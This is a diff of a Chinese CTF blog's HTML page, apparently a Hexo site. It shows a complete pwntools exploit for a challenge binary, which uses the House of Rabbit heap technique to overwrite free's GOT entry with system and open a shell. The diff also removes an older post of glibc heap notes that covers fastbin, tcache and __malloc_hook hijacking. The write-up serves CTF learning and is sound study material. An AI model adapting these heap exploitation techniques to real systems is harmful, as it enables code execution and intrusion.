class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf = ELF(<span class="string">&#x27;./mutepig&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line">context(arch=elf.arch, os=elf.os,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process([elf.path])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote()</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG <span class="keyword">and</span> local:</span><br><span class="line">	gdb.attach(io, </span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;	</span></span><br><span class="line"><span class="string">	b 0x400bce</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p    = <span class="keyword">lambda</span>      : pause()</span><br><span class="line">ru   = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl   = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">r    = <span class="keyword">lambda</span> x    : io.recv(x)</span><br><span class="line">s    = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl   = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia   = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla  = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa   = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x    : u32(r(x).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x    : u64(r(x).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> x,y  : log.success(<span class="built_in">str</span>(x) + <span class="string">&#x27; -&gt; &#x27;</span> + <span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    p()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">     sl(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="keyword">case</span>,content</span>):</span><br><span class="line">     menu(<span class="number">1</span>)</span><br><span class="line">     sl(<span class="built_in">str</span>(<span class="keyword">case</span>))</span><br><span class="line">     s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">     menu(<span class="number">2</span>)</span><br><span class="line">     sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content1,content2</span>):</span><br><span class="line">     menu(<span class="number">3</span>)</span><br><span class="line">     sl(<span class="built_in">str</span>(idx))</span><br><span class="line">     s(content1)</span><br><span class="line">     s(content2)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    add(<span class="number">3</span>,<span class="string">b&#x27;snor&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="string">b&#x27;lax&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    dele(<span class="number">1</span>)<span class="comment">#扩大top chunk</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#构造fastbin链</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    payload0 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x11</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>)[:<span class="number">7</span>]</span><br><span class="line">    <span class="comment">#dbg()</span></span><br><span class="line">    edit(<span class="number">2</span>,p64(<span class="number">0x602130</span>)[:<span class="number">7</span>],payload0)</span><br><span class="line">    add(<span class="number">3</span>,<span class="string">b&#x27;3&#x27;</span>)<span class="comment">#将fakechunk归入bin中</span></span><br><span class="line">    <span class="comment">#更改fake chunk的size</span></span><br><span class="line">    payload1 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xa00001</span>)</span><br><span class="line">    <span class="comment">#dbg()</span></span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>,payload1)</span><br><span class="line">    add(<span class="number">3</span>,<span class="string">b&#x27;4&#x27;</span>)<span class="comment">#faekchunk入largebin</span></span><br><span class="line">    <span class="comment">#free_plt = 0x0000000000602018</span></span><br><span class="line">    payload2 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xfffffffffffffff1</span>)<span class="comment">#case13337申请0xFFFFFFFFFFFFFF70LL </span></span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">&#x27;3&#x27;</span>,payload2)</span><br><span class="line">    add(<span class="number">13337</span>,<span class="string">b&#x27;5&#x27;</span>)<span class="comment">#这里执行过后remainder位于0x6020b0</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">1</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>])[:<span class="number">7</span>])<span class="comment">#这里free_got就在0x6020c0处</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])[:<span class="number">7</span>],p64(<span class="number">0x70</span>)[:<span class="number">7</span>])<span class="comment">#通过0索引修改free_got</span></span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#dbg()</span></span><br><span class="line">    ia()</span><br></pre></td></tr></table></figure>
 
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-rabbit/">ctf-wiki</a></p>
 <p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-280246.htm#msg_header_h3_9">我可是会飞的啊师傅</a></p>
@@ -1140,121 +1259,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/16/heap/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/avatar.png">
-      <meta itemprop="name" content="Sn0r1ax">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome!">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/04/16/heap/" class="post-title-link" itemprop="url">heap</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-04-16 18:13:28" itemprop="dateCreated datePublished" datetime="2025-04-16T18:13:28+08:00">2025-04-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-04-27 22:13:00" itemprop="dateModified" datetime="2025-04-27T22:13:00+08:00">2025-04-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h1><p><img src="/../images/heap/0.png" alt="0"></p>
-<h1 id="global-max-fast"><a href="#global-max-fast" class="headerlink" title="global_max_fast"></a>global_max_fast</h1><p><strong>glibc（GNU C Library）中动态内存分配器（ptmalloc2）</strong> 的一个关键全局变量，用于控制 <strong>fast bins（快速分配区）</strong> 的最大内存块大小。</p>
-<p>可以通过漏洞修改其大小来达到特殊的效果</p>
-<h1 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h1><p>单向链表</p>
-<p>32位下fast bin范围为16到64</p>
-<p>64位下fast bin范围为32到128</p>
-<p>从块分配器的角度来看，fastbin 中的块被视为已分配的块。它们仅在 malloc_consolidate 中批量与相邻对象合并。</p>
-<h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_int_free</span><br><span class="line">    -&gt; if ((size) &lt;= get_max_fast ())</span><br><span class="line">        -&gt; unsigned int idx = fastbin_index(size);</span><br><span class="line">        -&gt; fb = &amp;fastbin (av, idx);</span><br><span class="line">        -&gt; mchunkptr old = *fb, old2;</span><br><span class="line">        -&gt; if (old == p)</span><br><span class="line">            -&gt; malloc_printerr (&quot;double free or corruption (fasttop)&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>这里对double free漏洞的检查:</p>
-<p>获取fastbin链表中最后入链的old,然后判断即将释放的fastbin和old的指针是否相同</p>
-<h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><p>unsorted bins的bk和fd指向的是一个指针,而这个指针指向的是top chunk的地址,这个地址又储存在main_arena的0x58偏移处</p>
-<p>main_arena - 0x10即为__malloc_hook的,__malloc_hook又是调用malloc时会调用的指针,所以可以通过劫持__malloc_hook来劫持程序控制流</p>
-<p>然后通过fastbin attack将下一个堆块改为__malloc_hook - 0x23处,因为只有改为这处,视为堆块的此处的size位置才为正确的数据</p>
-<h1 id="binmap"><a href="#binmap" class="headerlink" title="binmap"></a>binmap</h1><h3 id="Binmap的底层结构"><a href="#Binmap的底层结构" class="headerlink" title="Binmap的底层结构"></a><strong>Binmap的底层结构</strong></h3><ol>
-<li><p><strong>物理存储</strong><br> <code>binmap</code>是<code>malloc_state</code>结构体中的一个数组（<code>unsigned int binmap[BINMAPSIZE]</code>），每个元素为32位无符号整数（<code>unsigned int</code>）。</p>
-<p> 总长度：固定为4个int(即128位，对应63个large bin的索引需求）</p>
-<p> 分组逻辑：每个int（32位）称为一个block,每个block负责管理32个连续的large bin状态</p>
-</li>
-</ol>
-<h1 id="计算main-arena"><a href="#计算main-arena" class="headerlink" title="计算main_arena"></a>计算main_arena</h1><ol>
-<li><p>通过上面的泄露unsorted_bin的fd指针</p>
-</li>
-<li><p>通过__malloc_trim函数直接获得</p>
-</li>
-<li><p><img src="/../images/heap/1.png" alt="1"></p>
-</li>
-</ol>
-<p>  <strong>“比如把 <code>.so</code> 文件放到 IDA 中，找到 <code>malloc_trim</code> 函数，就可以获得偏移了。”</strong> -–ctfwiki</p>
-<h1 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h1><p><em>glibc 2.26后</em></p>
-<p><strong>两个结构体</strong></p>
-<h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><p>仅限glibc2.26,可以直接对其进行double free</p>
-<h2 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="line">   the chunk is stored in the per-thread cache.  */</span><br><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
-
-<p>一个单向链表</p>
-<h2 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/* There is one of these for each thread, which contains the</span><br><span class="line">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="line">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="line">   are redundant (we could have just counted the linked list each</span><br><span class="line">   time), this is for performance reasons.  */</span><br><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"># define TCACHE_MAX_BINS                64</span><br><span class="line"></span><br><span class="line">static __thread tcache_perthread_struct *tcache = NULL;</span><br></pre></td></tr></table></figure>
-
-<p>通过counts记录tcache_entry上空闲的chunk数目</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1326,7 +1330,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1339,7 +1343,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
